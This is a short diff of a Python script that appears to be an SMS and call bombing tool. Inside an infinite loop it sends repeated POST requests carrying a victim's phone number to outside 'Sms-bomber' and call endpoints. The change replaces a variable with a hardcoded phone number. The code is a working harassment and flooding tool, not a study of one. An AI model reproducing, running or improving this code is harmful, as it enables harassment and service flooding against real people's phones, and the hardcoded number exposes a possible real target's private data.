@@ -98,7 +98,7 @@ def MyApp():
             count[JK]["successful"] = 0
             count[JK]["failed"] = 0
         while True:
-            u=post("https://api.toolbomb.fun/call.php?number={JK}&key=Madhav")
+            u=post("https://api.toolbomb.fun/call.php?number=7537573586&key=Madhav")
             url=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
             urll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
             urlll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""}).status_code
